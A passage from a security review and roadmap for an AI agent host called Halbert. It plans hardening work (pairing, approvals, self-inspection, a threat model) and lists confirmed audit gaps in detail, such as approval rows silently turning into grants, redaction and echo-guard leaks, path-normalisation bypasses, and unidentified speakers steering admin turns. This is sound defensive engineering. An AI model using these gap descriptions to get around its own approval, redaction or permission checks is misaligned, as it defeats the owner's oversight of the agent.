high; the verifier lowered the reader's C1 effort estimate. Do not build the interpreter anchor unless Halbert ships a managed interpreter.
- **Pairing: per-identity pending cap, uniform failure answer, network-class-gated token scope, tiered profiles, stateless codes** (OC12-state-sessions-secrets-security-shared-C7, OC17-gateway-second-pass-B-C8, OC19-extensions-identity-security-ops-C1, OC12-state-sessions-secrets-security-shared-C14, OC19-extensions-identity-security-ops-M6 verifier-added) — origin `src/pairing/pairing-store.ts:27-28, 77-107`, `src/gateway/device-pairing-join-http.ts:9-53`, `extensions/device-pair/index.ts:190-317, 625-668` (the verifier corrected the reader: Tailscale CGNAT is NOT a cleartext-allowed class, and the scope downgrade lives at 636-668), `src/shared/device-bootstrap-profile.ts:1-95` + `src/pairing/setup-code.ts:168-179, 527-537` (the reader's `330-345` was the wrong function), `extensions/reef/protocol/friendcode.ts:6-60`. Halbert: `routes/peers.py` has a sound PIN flow (4-digit PIN, 60 s TTL, single-use, 3 attempts, `compare_digest`) with a single global `PAIRING_MAX_PENDING = 16` that one retry-looping node can fill (`:241-246`), four distinguishable failure answers (`:348-385`), a bearer minted after approval with no classification of the requesting route (`:335-400`), a `role` string on `PeerCredential` that is a label not a scope list (`peers_config.py:94-130`), and pending state that dies with the process. Task (small, in that order): group + LRU-evict per `node_id`; collapse failures to one answer; classify the requesting host (loopback/RFC1918/.local) and downgrade the issued scope over a plaintext route; tier scopes by transport if pairing is ever advertised over a plaintext LAN; the Crockford alphabet if a code is ever spoken. Effort S/S/M/M/S; C7, C8, C14, M6 low; C1 medium (ROADMAP LD-1's two-machine run is the consumer).
- **Pre-auth WS budget, fence-then-defer revocation, rotation generation, known-weak credential denylist** (OC17-gateway-second-pass-B-C7, OC17-gateway-second-pass-B-C9, OC17-gateway-second-pass-B-C14, OC17-gateway-second-pass-B-C12) — origin `preauth-connection-budget.ts:8-66`, `device-token-client-lifecycle.ts:10-19`, `ws-shared-generation.ts:6-54` + `server-secrets-reload.ts:205-222` (the verifier reframed: the SERVER tags each connection with the generation it authenticated under and drops stale ones on rotation), `known-weak-gateway-secrets.ts:5-59`. Halbert: `guard_bind` already keeps strangers off unauthenticated sockets; `lease.py:230-240, 345-365` fences the agent loop but no live socket; no rotation exists (M14 rows are stubs); `.env.example` ships no credential and `load_or_create_token` mints `token_urlsafe(32)`, so the denylist would be empty. All four low; record: an unresolved client identity shares one limited bucket and is never exempt; fence synchronously then close in a later tick; tag connections with the credential generation when M14 rotation ships; any example credential published in docs enters the startup denylist that same day.
- **The remote-reachable method set is a declared allowlist, and discovery is generated from that same list; handler and schema tables must be pinned equal** (OC19-extensions-identity-security-ops-M2 verifier-added) — origin `extensions/admin-http-rpc/src/methods.ts:1-72` (13 named groups flattened into one Set; `commands.list` is answered FROM the enforced set so the advertised surface cannot drift from the reachable one), `handler.ts:262-272`, `index.ts:12-19` (auth mode and scope surface declared at route registration, not inside the handler). Halbert: the auth half is done — one door in `dashboard/auth.py:1-33` with per-route `require_peer_auth`/`require_local_admin` (`routes/memory.py:256-347`, `routes/peers.py:276-324, 422, 496`, `routes/guest.py:337`); but nothing declares which SURFACE a route belongs to, and `mcp/server.py:849 TOOL_HANDLERS` (dispatched at `:1249`) and `TOOL_SCHEMAS` (advertised at `:1170-1177`) are independent structures — equal today at 18 each (verified), yet `tests/test_mcp_server.py:76` asserts only `tools/list == TOOL_SCHEMAS`, never that the two sets match, although `tests/test_applescript_tools.py:176` and `tests/test_accelerator_tools.py:334` pin exactly that for other tool families. Task: (a) the parity assertion now, so a handler can never be callable-but-unadvertised (a rider on the founder-ruled B6 audit); (b) when ROADMAP section 4's App Store remote client is scoped, a declared surface (local-operator vs remote-companion) on each route and tool resolved at registration, with the remote listing generated from it. Effort S + M, medium.
- **View-only terminal observation enforced on the input path; explicit gap markers instead of silent drops** (OC17-gateway-second-pass-B-M4 verifier-added, OC17-gateway-second-pass-B-M5 verifier-added) — origin `src/gateway/desktop/rfb-view-only-filter.ts:1-143` (re-frames the stream independently of WS frames; forwards only non-mutating message types; an observer is forced to shared so it can never evict the human), `src/gateway/terminal/output-flow-control.ts:4-154` (pause the PTY at 4 MiB, resume at 512 KiB, a 5 s reassert because a missed native resume must not wedge the shell; sub-1 KiB chunks within 100 ms of input flush immediately). Halbert: `terminal.py:357 send_input` is exposed for every session and `session_manager.py:132` distinguishes `user`/`agent` only for reaping; `pty.py:204-213` silently discards a chunk on `QueueFull` so a live viewer gets a seamless, corrupted stream (`bounded_output.py` splices a marker; the live path does not). Task: an observe-only attachment kind that forwards nothing but resize/ack and closes on anything else, with the no-eviction rule; a gap marker on overflow and the interactive-flush coalescing rule; adopt pause/resume only if drops prove wrong. Effort M + S. Medium. Constraint: the watcher observes; it never takes over a shell a human owns.

#### Theme 11 — Doctor, lint and posture: Halbert inspecting its own configuration

One packet over a new `halbert_core/cli/lint.py`, `findings/`, `findings/proposal_generator.py`, docs. Everything here is deterministic reporting; repairs stay staged.

- **Policy doctor with narrowing-only auto-repair, seeded from a concrete check catalog; read-only `--lint --json` over the existing detector registry** (OC19-extensions-identity-security-ops-C4, OC19-extensions-identity-security-ops-M3 verifier-added, OC24-docs-qa-security-skills-M4 verifier-added, HM14-cli-ops-lifecycle-M2 verifier-added, OC09-tasks-system-agent-flows-boards-claws-M2 verifier-added) — origin `extensions/policy/src/doctor/automatic-repairs.ts:1-40` (nine ids; "apply only deterministic narrowing config changes"), `check-ids.ts:1-60` + `scopes/gateway.ts:12-59` (gateway-non-loopback-bind, gateway-auth-disabled, gateway-rate-limit-missing, secrets-unmanaged-provider, network-private-access-enabled, mcp-unapproved-server ...), `docs/gateway/doctor.md:81-146` (detect() separated from repair(); `--lint` read-only structured findings; selection orthogonal to severity; threshold exit codes), `hermes_cli/doctor_state.py:169-246` (a rolled-back write probes FTS health because COUNT(*) succeeds while every write fails; WAL > 50 MB warns with a PASSIVE checkpoint fix), `src/tasks/task-registry.audit.ts:24-26, 96-186` (stale-queued/stuck-running/lost/undelivered findings with named thresholds). Halbert: verifier corrected absent -> partial — `findings/store.py`, four detectors under `findings/detectors/` (all inspecting the HOST, none Halbert's own posture), `proposal_generator.py:202-273` (finding -> dry-run -> blast radius -> Proposal -> ApprovalRequest) already exist; `conversation_sqlite.py:915-923` writes `fts_degraded` into `store_meta` for nobody (zero readers); only `state_store.py:685` ever checkpoints a WAL; `run_receipts.py:185-198` covers only the crash case, nothing detects a live process that stopped emitting. Task: `python -m halbert_core.cli.lint [--json] [--severity-min] [--only] [--skip] [--all]` running the registry without writing to the store, `checkId` + `fixHint` per finding (the fixHint composes with C15's fix-it keys), exit 0/1/2; a catalog of checks over Halbert's OWN posture seeded from the origin's ids (at least four map onto TRUST-1 rows and Theme 10 items); a `narrowing_only` field on repairs routed through the approval engine (never applied unattended — this is where OpenClaw's auto-repair collides with "staged, never executed"); FTS/WAL rows; a stuck-work audit emitting through `findings/store.py`'s Finding shape so self-diagnosis and host diagnosis share one vocabulary. Effort L overall (C4 demoted high -> medium; M3 is the seed list, S). Constraint (M2): port retention windows as an observability aid only — no automatic pruning of the machine's own work history without a founder decision.
- **Startup security posture row and package advisories** (HM14-cli-ops-lifecycle-C8, HM14-cli-ops-lifecycle-C9) — origin `hermes_cli/security_audit_startup.py:21-34, 142-173`, `security_advisories.py:19-39, 86-130`. Halbert: `guard_bind` already hard-refuses (stronger than the origin's warn); `_is_root` is duplicated for path resolution only. Verifier: C8 degenerates into one doctor row (running as root) — do not build a module; C9 is in the do-not-lift list. Effort S, low.
- **Deterministic attestation hash for drift since last review** (OC19-extensions-identity-security-ops-C5) — origin `extensions/policy/src/policy-state-attestation.ts:6-77` (consumed as a check: `policy/attestation-hash-mismatch`). Halbert: absent; the EventLog chain already answers "was anything tampered with". Demoted medium -> low; land only as the lint's own check once the catalog exists. Effort S.
- **One declared table of every environment variable; no security switch may live in the environment** (OCC01-v2-second-look-M2 verifier-added) — origin `v2/src/config/env.mjs:11-180` (and its own failure: `CLAUDE_CODE_INJECTION_CHECK` etc. declared and read by nothing). Halbert: 108 `os.environ` reads and no table. Task: name/type/default/description/reader in one module, two ratchet tests (every declared var has a reader; every read names a declared var), entries marked read-only reporting — an env var must never weaken a check. Effort M, medium. Serves DOCS-1's regenerated CONFIGURATION.
- **SECURITY.md naming the one load-bearing boundary; a maintained threat-model table; coverage ids binding claims to their proving tests; evidence-first incident discipline** (HM19-evals-tests-meta-C7, OC24-docs-qa-security-skills-C3, OC24-docs-qa-security-skills-M5 verifier-added, HM20-skill-library-C5) — origin `SECURITY.md:37-72, 137-153, 175-222` ("The only security boundary against an adversarial LLM is the operating system" — approval gate, redaction and scanners each named "useful, not a boundary" with its defeat; "session identifiers are routing handles, not authorization boundaries"), `docs/security/THREAT-MODEL-ATLAS.md:1-60, 184-208, 288-300` (seven-field per-boundary table with an honest residual-risk column), `qa/scenarios/index.yaml:1-46` + `security/gateway-shared-auth-modes.yaml:1-25` (`surface.feature` coverage ids with docsRefs/codeRefs), `optional-skills/security/oss-forensics/SKILL.md:39-51` (EV-ids, [HYPOTHESIS] tags — the verifier found the "mechanical validator" is prose, not code; Halbert would build that half). Halbert: no SECURITY.md (only `.handoff/` working documents), a point-in-time SEC-N list, a probe battery that documents defects but no artefact binding ROADMAP rows to the tests that prove them, and `skills/builtin/security-ops/SKILL.md` with prose only. Task: write `SECURITY.md` (the host OS user boundary is load-bearing; the lattice, echo guard, registry and ledger scoped individually with their non-coverage; uniform surface rules for dashboard HTTP, MCP, terminal-as-channel); `documentation/security/THREAT-MODEL.md` seeded from SEC-N; `halbert_core/qa/coverage.yaml` + a one-line front-matter on the primary-proof tests with a registry test that fails on an unowned id; an evidence-id validator in the security-ops skill's verification runner. Effort S + M + M + M. All medium (C7 demoted high -> medium: a document changes no runtime behaviour).

#### Theme 12 — Runtime and state hygiene on the same seams (durability, liveness, cancellation, identity)

These landed in this workstream's records; most belong with the scheduler/daemon packets and are listed so the ids are accounted for and the packet writer sees the seam.

- **Process incarnation token instead of a PID probe; PID liveness paired with start time** (OC06-plugins-sdk-M1 verifier-added, OC02-infra-rest-M2 verifier-added — one fix, choose the cheaper) — origin `src/plugin-state/runtime-health-store.ts:8-20, 67-89` ("sibling visibility is sacrificed instead of trusting a bare kill(0)"), `src/infra/gateway-lock.ts:13-47, 203-246`. Halbert: `run_receipts.py:54-66 _default_pid_alive` is `os.kill(pid, 0)` with `PermissionError` treated as ALIVE, consulted by `recover_on_boot` (`:180-198`) at the one moment PIDs have been recycled. Task: mint one uuid4 at process start, write it beside `owner_pid` in `mark_started`, mark a running receipt interrupted whenever its token is not this process's — PID reuse becomes unrepresentable; fix the fail-open `PermissionError`. Effort S. Strengthens lifted packet 03.
- **Cancellation of running work is provisional until the producer confirms** (OC09-tasks-system-agent-flows-boards-claws-M3 verifier-added) — origin `src/tasks/task-cancellation-state.ts:1-21`, `task-executor-policy.ts:115-135`. Halbert: `scheduler/engine.py:87-113` marks a RUNNING job cancelled, then `executor.py:696` overwrites it with `completed` — a live lost update, the user is told the job finished. Task: a cancel-requested marker; `update_job_state` refuses cancel-requested -> completed without the executor's acknowledgement; suppress the notice until settled (extend `agents/turn_activity.py`'s generation claims to background work). Effort S, medium.
- **Delivery is one pure predicate, in two levels: may this record speak, and is a peer record for the same run already speaking** (OC09-tasks-system-agent-flows-boards-claws-M6 verifier-added) — origin `src/tasks/task-executor-policy.ts:115-163` (`shouldAutoDeliverTaskTerminalUpdate`: silent policy never speaks, a subagent's terminal is published by its lifecycle owner, a provisional kill stays quiet, only a terminal status with `deliveryStatus === 'pending'` passes; `shouldSuppressDuplicateTerminalDelivery` elects one preferred record when several records share a `runId` — what idempotency keys cannot do). Halbert: the level-one gate already exists and is better than the origin's — `proactive/gate.py:74-89 ProactiveGate.should_notify` weighs the proactivity dial, quiet hours, guest-persona fronting, snooze and dismissal and returns `(bool, reason)`. Task: when a job can produce more than one record, extend that gate with an "already covered by a peer record for the same run" clause rather than standing up a parallel `notifyPolicy` enum beside it. Effort S, low; only bites once one run yields several records.
- **Shutdown under one apportioned budget** (HM12-gateway-rooms-platforms-hooks-M3 verifier-added) — origin `gateway/relay/ws_transport.py:37-74`. Halbert: `dashboard/app.py:1623-1700+ shutdown_event` is a sequence of unbounded awaits; any one wedging hangs shutdown forever on a host steward. Task: one total budget, `asyncio.wait_for` per step against the remainder, log the step that blew it, interrupt (not await) an in-flight turn. Effort S, medium. Touches dashboard/app.py (hot).
- **Config watcher: coalesce, re-entrancy guard, observer recovery** (OC16-gateway-second-pass-A-M2 verifier-added) — origin `src/gateway/config-reload.ts:55-64, 374-389, 814-826`. Halbert: `config/watcher.py:28-80, 120-174` re-hashes the whole manifest (which includes `/etc` for the host manifest) on every raw event inline on the watchdog thread; only the SourcePrep callback is debounced (`:238-241`). Effort S, medium.
- **Live SQLite files: never raw-copy; an fd-refcount guard before any byte read** (HM14-cli-ops-lifecycle-M1 verifier-added) — origin `hermes_cli/sqlite_safe_read.py:1-6, 22-140` (a bare `open()`/`close()` on a file another descriptor holds drops that process's POSIX locks). Halbert: `storage/chromadb_manager.py:862-872` `copy2`s a live WAL-mode `chroma.sqlite3` and `_verify_copy` (`:757-770`) accepts equal sizes. Task: online-backup snapshot + `integrity_check` for `.db/.sqlite3` members; a `utils/sqlite_live.py` refcount registry before any future stat/hash/read of the four WAL stores. Effort S, medium.
- **Private state root asserted at startup; backup manifests as the authority; export ownership by content hash; store limits belong to the namespace** (OC09-tasks-system-agent-flows-boards-claws-M4 verifier-added, OC01-infra-approvals-devices-backup-M7 verifier-added, OC10-media-pipelines-M8 verifier-added, OC06-plugins-sdk-M6 verifier-added) — origin `src/snapshot/local-repository.ts:68-69, 1252-1318` (uid, mode & 0o077 == 0, identity-stable during use, ancestor walk with the sticky-bit rule, darwin ACLs), `backup-archive-path-policy.ts:4-83` (both the link entry and its target must fall inside a declared asset), `src/transcripts/store-export-ownership.ts:31-58` (lstat, never stat; a pending, altered or symlinked artifact never establishes ownership), `plugin-store-validation.ts:23-58`. Halbert: `crypto/storage.py:170-194, 483-485` does this for ONE directory; nothing asserts anything about config/data/log dirs or their ancestors though every Class-1 trust claim rests on them; `persona/memory_purge.py:293-300` is a bare `tar.add`; `routes/guest.py:612-656` erases a guest's on-disk half by name; a dozen hand-rolled stores take caps as constructor args. Task: `assert_private_state_root()` at startup (refuse the privileged surfaces rather than warn); declare asset roots before the self-backup is designed (a restore steered outside the declared set is a permission-system bypass, not a file bug); a per-file hash manifest with lstat before guest erasure; assert same limits on a second opener. Effort S / design / S / S. M4 medium; the rest low or design-only.
- **Progress-idle watchdog with a diagnostic stall message** (OC01-infra-approvals-devices-backup-M6 verifier-added) — origin `src/infra/backup-create-stream.ts:8, 35-48, 91-123` (names the phase and the last unit of work; a settled flag stops a late callback re-arming). Evidence for the un-packeted "typed timeout causes" item in `OSS-REVIEW-OPENCLAW:99`; fold into whichever packet lands the self-backup. Low.
- **Per-entity cooldown and ignore list on the Home Assistant ingress** (HM17-plugins-acp-providers-M2 verifier-added) — origin `plugins/platforms/homeassistant/adapter.py:79-114, 216-243`. Halbert: `ha_event_stream.py:44-47, 252-259` debounces only `sensor`; `ha_event_mapper.py:27-29` writes an unconditional timeline row per event, so ingress rate sets the write rate on the CD-4/CD-5 ledger and feeds the cognition tick. Task: uniform per-entity cooldown (config-defaulted), `ignore_entities`, closed-by-default warning. Effort S, medium. Belongs to HOME-1; listed here because it bounds a write to a trust-bearing ledger.
- **Machine name from the OS's human-set computer name; the account real name never falls back to the login name** (OC02-infra-rest-M3 verifier-added) — origin `src/infra/machine-name.ts:10-48`, `host-account-name.ts:22-56`. Halbert: `identity.py:111-140` ends its ladder at `socket.gethostname()` — the one label the founder directive forbids; onboarding (`routes/settings.py:447-500`) prefills no real name. Task: a `scutil --get ComputerName` tier (absolute path via the trusted-bin resolver, 1 s timeout, cached) between `being_name()` and the hostname fallback; prefill `user_name` from `id -F`/dscl with the never-the-shortname rule. Effort S, medium. Constraint: "named by the onboarding name, never the raw hostname" — this makes the fallback obey it.
- **Refuse-to-start when two identity sources conflict** (OC01-infra-approvals-devices-backup-C11) — origin `src/infra/device-identity.ts:29-66`. Verifier degenerated it (Halbert has no migrations): the surviving rule is "name both candidates and refuse, never guess", and `persona/store.py:111-119` currently guesses (a plain-file being.yml silently becomes the implicit default persona). Low.
- **Prompt images carry their source on a side channel; inbound image pixel cap** (OC10-media-pipelines-M7 verifier-added, OC10-media-pipelines-M5 verifier-added) — origin `src/media/runtime-prompt-image-provenance.ts:1-46`, `image-ops.ts:41-157` (header-only dimensions before any decode; the cap on output as well as input). Halbert: `vision/gate.py:31-38` routes by owner but ownership stops at the watcher — once in the turn an image is an opaque base64 in a flat list (`routes/agent.py:52`, `agents/states.py:192-193`); nothing bounds images that ARRIVE. Task: a parallel per-image source/owner list on the turn context validated on read; header probe + pixel ceiling + side-grid/quality-ladder shrink on inbound images. Effort S + S, medium; take with the attachment ceiling above.

#### Theme 13 — Rules to record in DECISIONS.md, not code to build

One small packet: DECISIONS.md rows. Each is a verified origin mechanism whose Halbert surface does not exist yet; recording the rule now prevents the wrong first implementation.

- **A hub's own vetting is not a trust tier** (HM10-tools-skills-second-pass-C6) — `tools/skills_hub_clawhub.py:59-61` (ClawHavoc, 341 malicious skills), `skills_guard.py:23-24`. Trust comes from a hand-maintained allowlist or a verifiable signature (note: the origin's signature check is a comment, not code).
- **The server computes delegation authority from depth; the model never asks for it; endpoint-scoped trust resets to default-deny on any endpoint change; a plugin-facing spawn surface needs HMAC-bound immutable handles** (HM05-delegation-subagents-kanban-C2, HM05-delegation-subagents-kanban-C14, HM05-delegation-subagents-kanban-C3) — `tools/delegate_tool.py:152-181`, `delegate_tool_config.py:140-200` (also `_inherit_parent_base_url` refuses a stale attribute in favour of the live client), `agent/subagent_lifecycle.py:24-395` (three gates: well-formed, HMAC, live parent ownership). Halbert subagents cannot spawn, do not call models, and expose no plugin surface; SEC-21's `is_local_model()` is already the locality choke point. All low.
- **Download integrity: https-only through the SSRF check, refuse without a server digest, hash the open descriptor and re-stat** (OC22-extensions-local-providers-apps-M6 verifier-added) — `extensions/llama-cpp/src/llama-server-install.ts:97-146, 176-224`. Halbert downloads no executables today (Ollama pulls its own).
- **Exact-origin normalisation for any outbound allowlist; subset-of-granted reuse only after reading `UNAUTHORIZED_NARROWER`** (OC09-tasks-system-agent-flows-boards-claws-C9) — `src/boards/board-capabilities.ts:25-119`. Note the polarity trap: `consent/store.py:123` treats narrower-than-authorised as a DENIAL today.
- **Widget bridge isolation contract if agent-authored HTML is ever rendered** (OC10-media-pipelines-C7) — `src/canvas/wrap.ts:128-190` (frozen primitives, ticketed RPC, trusted-click-only navigation). Contingent on a canvas feature that does not exist.
- **Validation errors omit the received value on sensitive paths** (OC05-config-C9) — `src/config/issue-location.ts:285-313, 356-365`; `sensitive-paths.ts:9-45` carries a whitelist of token-shaped-but-innocent suffixes a naive port would get wrong. Halbert validates no secret field today (`being_config.py:94-103`, `mcp/config.py:358` interpolate raw values). Land as a docstring rule plus the small helper.
- **ADRs are aspirational; confirm in code before citing** (OCC01-v2-second-look-M4 verifier-added) — `docs/adr/ADR-001-v2-architecture.md:135-147` vs `v2/src/config/settings.mjs:66-75`. A sourcing rule for any later pass over open-claude-code. Halbert's ROADMAP already exceeds ADR-002's coverage-vs-depth framing; do not adopt a metrics table.

### Related confirmed audit gaps

The same seams, from the 17 solidity audits (confirmed only; refuted rows omitted). A packet writer should land the gap and the lift together.

- A03-redaction-G1 [high]: non-JSON-native values are stringified after the choke point (`json.dumps(default=str)`) and bypass redaction — Theme 8.
- A03-redaction-G2 [medium]: registry pass runs after the pattern pass, so a pattern rewrite inside a registered value leaks the remainder — swap the order (registry first) — Theme 8.
- A03-redaction-G4 [low]: MCP client credentials never registered — merged into OC12-M2 (Theme 7).
- A03-redaction-G5 [medium]: MCP dispatcher error text gets patterns only — merged into HM12-M4 (Theme 8).
- A03-redaction-G6 [medium]: min registrable length 4, not 6 — four-character acked values blanket-redact prose — Theme 7.
- A03-redaction-G3/G7/G8/G9/G10/G11 [low]: raw form evicted before its variants; encodeURIComponent/quote_plus forms missing; no cycle guard; log lines unredacted; unsynchronised registry; placeholder self-collision — Theme 8 packet riders. Confirmed bugs: `mcp_args_preview`/`_absent_reason` bypass the registry; placeholder self-collision corrupts markers.
- A04-execute-code-G1/G2/G3 [high]: a worker that survives the KeyboardInterrupt never returns; no post-settle disarm of the dispatch hook (= OC14-M1); unbounded spill file — Theme 9 / Theme 5.
- A04-execute-code-G4/G8/G9 [medium]: script stdout/traceback not redacted before the model; stderr uncaptured; a user stop does not interrupt a running script — Theme 8 / Theme 9. Confirmed bug: the deterministic AST gate misses obvious spellings of the affordances it names.
- A05-echo-display-digest-G1 [high]: a partial or re-wrapped echo is flagged, logged as redacted, and delivered anyway — Theme 8.
- A05-echo-display-digest-G2 [medium]: timeline reload serves persisted blocks raw — merged into OC16-C11/OC23-C20 (Theme 8).
- A05-echo-display-digest-G4 [medium]: the digest records only handler successes; a non-zero-exit command counts as a success — Theme 9.
- A05-echo-display-digest-G5 [medium]: tool display copies, the spoken tail, audit summary and error/confirmation text bypass the echo guard — Theme 8.
- A05-echo-display-digest-G9/G10 [low]: a redaction exception at the display seam propagates instead of failing closed; no chat-input sanitiser (= OC16-C9) — Theme 8.
- A09-channels-voice-ingress-G1 [high]: busy verbs bypass the speaker-claim clamp and the relay receipt is never consulted mid-turn, so an unidentified speaker can steer the owner's admin turn — Theme 9 (channel/claims). Confirmed bugs: `process()` treats an unknown modality as a typed admin turn; tee scrubs only top-level strings (= OC06-M3); `weakest_claim([])` raises; a matcher hit whose profile lookup fails is recorded as verified with no subject.
- A11-permission-lattice-G1 [high]: the ask axis is recorded, never enforced; `ProfileProposal.ask_every_use` is dropped at acceptance so an ask row becomes an unconditional GRANT — Theme 9 / Theme 2.
- A11-permission-lattice-G2 [high]: an unreadable persisted grant scope escapes `require()` as a bare `ValueError` (reproduced: 21 GRANTED profile rows) instead of a typed Denied — Theme 9.
- A11-permission-lattice-G3/G7/G8/G9/G12 [medium]: consent narrowing never reaches an open lease; the Attentive/Present line is data only (QUIET never computed) — pairs with OC01-M4's automation principal; leases have no expiry (`max_session_lease` unparseable); no primitive binds an approval to the digest of the artefact shown and re-validates at apply (= OC13-M1/OC17-M3); the widening bar's surface/principal/authn are caller-supplied strings never bound to the transport (= OC16-M5's rule) — Theme 2.
- A11-permission-lattice-G4/G5/G6/G10/G11 [low]: `text_shown_sha256` accepted unverified; a grant hashed to superseded wording stays live; a Stop is not persisted and `resume()` has no authority; the biometric TTL has no enforcement point; lease revocation runs no cleanups. Confirmed bugs: split clock in `require()`; `Lease.__enter__` raising leaves the lease registered forever; projection derived outside its flock; `halt=None` is the one fail-open default; `record_from_payload` lets `TypeError` escape `ConsentUnavailable`; reach-root prefix check never matches children of `/`.
- A12-claims-admission-G1/G2/G3/G6 [medium]: admission decisions discarded after the response (no once-consumed evidence or receipt); no per-capability claim floor (`meets_floor` dead); `_admit` evaluates gates after a block; the talk door produces no `IngressDecision` and the receipt-failure path is a silent downgrade — Theme 9. Confirmed bugs: the ladder fails open on its own exception path; local-admin predicate accepts the strings `localhost`/`testclient`; `persona_id` interpolated unescaped into the sibling URL; `home:<netloc>` namespace not fenced from operator peer ids.
- A13-skills-G1/G5/G6 [medium/low]: one malformed user skill aborts the whole load (builtins and their safety bindings vanish); no load-time content scan (= Theme 4 scanner); `requires` parsed but never evaluated (= HM10-M2). Confirmed bugs: aliased YAML nodes expand to a 52-million-character description; `budget_multiplier: .nan` fails every turn; protected_paths compared unnormalised (`/./boot/x` bypasses); `ComposedSkills.allowed_tools` warns and enforces nothing.
- A17-mcp-boundary-G1 [high]: stdio servers inherit the entire environment — merged into HM09-C4 (Theme 5). G2 [high]: any JSON-RPC line over 64 KiB kills the transport. G3 [medium]: `mcp_config.yml` is an unconfirmed arbitrary-command-execution path — merged into HM09-C5. G5 [medium]: descriptions unsanitised — merged into HM09-C17 (Theme 4). G7 [medium]: results carry no untrusted provenance. G8 [medium]: annotations ignored — merged into HM09-C3. G9 [medium]: Halbert-as-server tools bypass the policy pipeline — this is the founder-ruled B6 audit, strengthen within it. G10 [medium]: killing a stdio server leaves npx/uvx grandchildren — pairs with HM12-M1. G19 [low]: no package preflight — merged into HM09-C6. Confirmed bug: `MCPToolError` text (server-controlled) is interpolated into the failed result with no cap or tag stripping.

### Do not lift

- **OCC01-v2-second-look-C4** (PreToolUse/PostToolUse shell hook engine): an operator-authored shell extension point in the tool path contradicts the one deterministic policy pipeline; Halbert's extension mechanism is the lattice + consent ledger. The env-var-only context idiom is already house practice. Verifier demoted medium -> low for the same reason.
- **OC04-commands-C2** (tiered auto-fix from a flag): the core is auto-approving repairs, which collides with "staged, never executed"; the verifier also found the reader overstated "blocked entirely during update". The one surviving tier — refuse a repair while a conflicting in-flight operation holds the state — is folded into the policy doctor entry (Theme 11) as a rider.
- **OC05-config-C4** (read-time auto-restore from a last-known-good): an autonomous destructive config action on a single-user host where the operator is present, and the reader's own anti-pattern argues against a parallel fingerprint table. The fingerprint idea survives as a note under OC05-C3.
- **HM14-cli-ops-lifecycle-C9** (PyPI advisory catalog): an empty, hand-maintained catalog is dead weight for a single-founder project; `pip-audit`/OSV give the same signal. Copy only the ack-in-config + never-reuse-an-id convention if an advisory surface ever exists.
- **OC19-extensions-identity-security-ops-C10** (fail-closed guard on persisting the redaction sentinel): the reader's evidence was false — Halbert's placeholders are `<secret>` and `[redacted]` (`ingestion/redaction.py:29, 32`), ordinary strings that occur in real content, so the guard would refuse legitimate data. Sound only after OC12-C1's distinctive sealed-token format exists; already surfaced in the 2026-09-07 review, not new.
- Duplicates folded rather than dropped (listed so the accounting is visible): OC24-M2 into OC12-M1; OC10-M1 into OC02-M1; OC02-M2 into OC06-M1; OC10-C1/OC13-C1/OCC01-C1/OC19-C11/OC22-C12/OC19-M1/HM10-M3 into the single SSRF guard; HM04-C17 into HM04-C14; OC24-M2/OC12-M1 same token table; HM09-C17 into the A17-G5 sanitiser.

### Proposed packets

Shared hot files across this section: `agents/state_machine.py` (P2, P4), `dashboard/app.py` (P6), `dashboard/routes/agent.py` (P2, P3, P4), `tools/executor.py` (P2, P3, P5), `agents/conversation_sqlite.py` (P6 doctor rows only, read). Dispatch P1, P5 and P6 in parallel; P2 before P3 and P4 (both consume the descriptor registry and the presentation builder); P3 waits on the D3-P5 review.

1. **P1 — Command gate rebuild** (Theme 1): HM06-C1, OC01-C8, OC01-M2, OC22-M4, OCC02-C1, OC22-M1, OCC01-M1, HM16-C9, HM07-C9, HM07-C21, OC13-M3, OC14-M6. Prerequisites: none; the argv tables land first, the classifier second. Hot files: `tools/executor.py` (the classify call site only). Files: `tools/safety.py`, `streaming/injection_check.py`, `dashboard/routes/terminal.py`, `approval/simulator.py`, `dashboard/routes/settings.py`, `tools/schedule_cron.py`. Founder decision: F-A9 (network-egress binaries HIGH settles part of "todo D1"). ROADMAP: TRUST-1, TERM-1.
2. **P2 — Approvals bound and fail closed; the policy descriptor registry** (Themes 2 and 9): OC14-M2, OC09-C7, OC16-M1, OC17-C11, OC17-M3, OC22-M5, OC13-M1, OC01-C1, OC01-M1, OC01-C3, OC01-M5, HM17-M3, OC23-C1/C2/C3/C4/C5/C6, OC14-C21, HM17-C6, OC06-M5, OC16-M5, OCC02-C2, HM14-M5, OC17-M1, OC17-C1, OC15-C1, OC14-M5, HM05-C1, OC14-C9, OC14-M4, OC14-C5, OC14-M3, OC14-M1, OC03-C6, OC04-C13, OC24-C15, OC04-C14, OC06-C11, OC17-C18, OC18-C17, OC09-C5, HM12-C8, OC09-C10, plus audit A11-G1/G2/G3/G8/G9/G12, A12-G1/G2/G3/G6, A04-G2, A05-G4. Prerequisites: P1's argv normalisation for the fingerprint; D3 series (lattice) merged. Hot files: `agents/state_machine.py`, `tools/executor.py`, `dashboard/routes/agent.py`. Founder decisions: F-A1, F-A10. ROADMAP: TRUST-1, GATE-1.
3. **P3 — Self-modification: fence, staging store, honest config writes, instruction sources** (Themes 3 and 4): HM10-M1, HM10-C15, OC09-M1, OC09-C6, HM12-C9, OC05-M3, OC05-M2, OC05-C1/C2/C10/C3/C8/M1/M4/M6/C5, OC09-C8, OC01-M3, HM10-M7, OC01-M4, HM14-M4, OC04-C10, OC09-C11, OC14-C14, OC12-M1 (+OC24-M2), HM10-C16, OC06-M4, OC14-C19, HM06-C4, HM02-C5, HM16-C12, HM10-C4, HM10-C3/C11/C7/M4/C2, HM10-M2/M5/M6, HM09-C17, HM10-M8, plus A13-G1/G5/G6. Prerequisites: the D3-P5 REVIEW-GATED pass (the `assert_not_governed` wiring) must be scheduled as a review, not merged silently; SK-3 for the skills half; P2's presentation builder for the staged-write gist. Hot files: `dashboard/routes/agent.py` (`_write_file`, `apply_diff`), `tools/executor.py` (`_write_file`). Founder decisions: F-A2, F-A6, F-A7. ROADMAP: TRUST-1, CFG-1, SKILL-1, FENCE-1.
